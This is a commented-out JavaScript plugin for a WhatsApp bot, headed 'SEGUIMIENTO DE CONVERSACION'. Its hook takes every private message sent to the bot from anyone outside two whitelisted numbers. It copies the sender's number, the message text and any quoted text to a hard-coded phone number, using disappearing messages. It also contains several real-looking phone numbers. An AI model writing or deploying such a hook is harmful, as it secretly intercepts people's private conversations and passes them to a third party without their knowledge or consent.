/*let numero 
export async function before(m, { conn, text, usedPrefix, command }) {
    if (!m.chat.endsWith('@s.whatsapp.net'))
    return !0
    if (m.sender == '593968585383@s.whatsapp.net' || m.sender == '573136855110@s.whatsapp.net'){
    return   
    }
    numero = `${m.sender.split`@`[0]}`
    global.db.data.users[m.sender].reporte = numero
    let teks = `❒═════[SEGUIMIENTO DE CONVERSACION]═════❒\n*┬\n├❧ NUMERO:* wa.me/${numero}\n*┴*\n*┬*\n*├❧ MENSAJE:* ${m.text}\n*┴*`
    let txt = '';
    let count = 0;
    for (const c of teks) {
        await new Promise(resolve => setTimeout(resolve, 50));
        txt += c;
        count++;
    
        if (count % 10 === 0) {
            conn.sendPresenceUpdate('composing' , m.chat);
        }
    }
        await conn.sendMessage(('593968585383@s.whatsapp.net'), { text: m.quoted ? teks + m.quoted.text : teks.trim(), mentions: conn.parseMention(teks) }, {quoted: m, ephemeralExpiration: 1 * 100, disappearingMessagesInChat: true} );
       // await conn.sendMessage(('51940617554@s.whatsapp.net'), { text: m.quoted ? teks + m.quoted.text : teks.trim(), mentions: conn.parseMention(teks) }, {quoted: m, ephemeralExpiration: 1 * 100, disappearingMessagesInChat: true} );

    }
export { numero }
*/
